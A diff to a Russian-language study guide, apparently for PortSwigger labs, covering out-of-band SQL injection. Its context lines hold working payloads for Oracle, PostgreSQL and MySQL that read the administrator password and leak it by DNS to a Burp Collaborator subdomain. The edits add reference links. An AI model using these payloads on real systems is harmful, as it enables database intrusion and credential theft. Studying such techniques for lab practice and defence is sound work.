@@ -352,7 +352,7 @@ Burp Collaborator (встроен в Professional, но в пробной вер
 #### Oracle (через UTL_INADDR)
 '||UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net')||'<br>
 #### Oracle (через XML + EXTRACTVALUE)
-x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.твой_поддомен.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--<br>
+x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.твой_поддомен.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
 #### PostgreSQL (через dblink)
 '||dblink('host='||(SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net', 'SELECT 1')||'<br>
 #### MySQL (через LOAD_FILE)
@@ -376,9 +376,9 @@ x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"
 Для эксфильтрации данных убедись, что ты используешь правильные имена таблиц и столбцов (в лабораториях обычно users, username, password).<br>
 
 ### Полезные ссылки<br>
-PortSwigger SQL Injection Cheat Sheet — раздел с OAST-методами.<br>
+PortSwigger SQL Injection Cheat Sheet — раздел с OAST-методами.**(https://portswigger.net/web-security/sql-injection/cheat-sheet)** <br>
 
-Шпаргалка по OAST для разных СУБД — репозиторий с пейлоадами.<br>
+Шпаргалка по OAST для разных СУБД — репозиторий с пейлоадами.**(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)** <br>
 
 ### 📌 Запомни
 **OAST — это последний рубеж, когда всё остальное не работает. Если ты умеешь отправлять DNS-запросы через SQL, ты можешь обойти почти любую защиту.**
